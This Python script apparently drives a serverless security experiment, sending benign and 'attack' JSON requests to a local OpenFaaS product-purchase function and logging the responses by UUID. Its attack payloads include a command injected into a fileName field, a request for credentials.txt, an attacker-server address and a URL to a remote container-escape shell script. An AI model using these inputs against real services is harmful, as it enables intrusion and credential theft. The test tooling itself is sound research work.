import os
import requests
import json
import concurrent.futures
import random
import time
import uuid
import argparse


def generate_uuid():
    return str(uuid.uuid4())


def send_request(url, headers, datas, request_type, uuid_dict):
    response_string = ""
    print(f"datas: {datas}")
    data = datas[0]
    # for data in datas:
    try:
        print(f"{json.dumps(data)}")
        response = requests.post(url, headers=headers, data=json.dumps(data))
        response_string = response.text
        print(f"Status Code: {response.status_code}")
    except Exception as e:
        response_string = str(e)
        print(f"Error: {e}")
    finally:
        uuid_dict[headers["uuid"]] = {"type": request_type, "resp": response_string}


def perform_benign_requests(
    url,
    headers_benign_template,
    benign_dict,
    n_per,
    metadata_out_path,
):
    uuid_dict = {}
    for benign_name, benign_data in benign_dict.items():
        print(f"==== {benign_name} ====")
        for _ in range(n_per):
            headers_benign = headers_benign_template.copy()
            headers_benign["uuid"] = generate_uuid()
            send_request(url, headers_benign, benign_data, benign_name, uuid_dict)
    print("UUID dictionary:")
    # for uuid_key, value in uuid_dict.items():
    #     request_type, response_string = value.type, value.resp
    #     print(f"{uuid_key}: ({request_type}, {response_string})")
    with open(os.path.join(metadata_out_path, "metadata.json"), "w") as f:
        json.dump(uuid_dict, f, ensure_ascii=False, indent=4)
        
def perform_requests(
    url,
    headers_benign_template,
    data_benign,
    headers_attack_template,
    data_attack,
    n_benign,
    n_attack,
    total_time,
    metadata_out_path,
):
    total_requests = n_benign + n_attack
    interval = total_time / total_requests
    tasks = []
    uuid_dict = {}
    
    print(f"data attack: {data_attack}")

    for _ in range(n_benign):
        headers_benign = headers_benign_template.copy()
        headers_benign["uuid"] = generate_uuid()
        tasks.append((url, headers_benign, data_benign, "benign", uuid_dict))

    for _ in range(n_attack):
        headers_attack = headers_attack_template.copy()
        headers_attack["uuid"] = generate_uuid()
        tasks.append((url, headers_attack, data_attack, "attack", uuid_dict))

    random.shuffle(tasks)

    with concurrent.futures.ThreadPoolExecutor(max_workers=total_requests) as executor:
        futures = []
        print(f"Task cnt: {len(tasks)}")
        for task in tasks:
            start_time = time.time()
            futures.append(executor.submit(send_request, *task))
            elapsed_time = time.time() - start_time
            sleep_time = interval - elapsed_time % interval
            time.sleep(max(0, sleep_time))

        for future in futures:
            future.result()

    print("UUID dictionary:")
    # for uuid_key, value in uuid_dict.items():
    #     request_type, response_string = value.type, value.resp
    #     print(f"{uuid_key}: ({request_type}, {response_string})")
    with open(os.path.join(metadata_out_path, "metadata.json"), "w") as f:
        json.dump(uuid_dict, f, ensure_ascii=False, indent=4)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Process some integers.")
    parser.add_argument(
        "--n_per", type=int, required=True, help="Number of per benign requests"
    )
    parser.add_argument(
        "--typ", type=str, required=True, help="benign | attack"
    )
    parser.add_argument(
        "--metadata_out_path",
        type=str,
        required=False,
        default="./",
        help="Path to json metadata",
    )

    args = parser.parse_args()

    url = "http://localhost:31112/function/product-purchase"

    headers_benign_template = {
        "Content-Type": "application/json",
        "uuid": "",  # This will be filled with random UUID
    }

    data_benign = {"id": 1, "user": "alice", "creditCard": "1234-5678-9"}

    headers_attack_template = {
        "Content-Type": "application/json",
        "uuid": "",  # This will be filled with random UUID
    }

    data_attack_modify = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "malicious": "sas3",
        "fileName": "2.txt #\n echo '123' > 3.txt",
    }

    data_attack_leak = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "malicious": "sas6",
        "path": "credentials.txt",
    }

    data_attack_warm_1 = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "malicious": "one",
        "attackserver": "attackserver.openfaas-fn.svc.cluster.local:8888",
    }

    data_attack_warm_2 = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "malicious": "two",
        "attackserver": "attackserver",
    }

    data_attack_cf = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "cfattack" : "true"
    }

    data_attack_escape_1 = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "malicious": "escape_S1",
        "attackserver": "https://gitee.com/jinyuchata/escape-host/raw/master/escape2.sh"
    }

    data_attack_escape_2 = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "malicious": "escape_S2",
        "payload": ""
    }
    
    data_benign_pic = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "pic": 1
    }
    
    data_benign_query_price = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "pricedata": 1
    }
    
    data_benign_publish = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "publish": 1
    }
    
    data_benign_authroize = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9"
    }
    
    data_benign_place_order = {
        "id": 1,
        "user": "alice",
        "creditCard": "1234-5678-9",
        "test": "place-order" 
    }
    
    # url,
    # headers_benign_template,
    # benign_dict,
    # n_per,
    # metadata_out_path,
    if args.typ == "benign":
        perform_benign_requests(
            url,
            headers_benign_template,
            {
                "benign_place_prder": [data_benign_place_order]
            },
            args.n_per,
            args.metadata_out_path,
        )
    elif args.typ == "attack":
        perform_benign_requests(
            url,
            headers_benign_template,
            {
                # "attack_modify": [data_attack_modify],
                # "attack_leak": [data_attack_leak],
                # "attack_warm": [data_attack_warm_1, data_attack_warm_2],
                # "attack_cfa": [data_attack_cf],
                "attack_escape": [data_attack_escape_2],
                # "attack_escape": [data_attack_escape_1, data_attack_escape_2],
            },
            args.n_per,
            args.metadata_out_path,
        )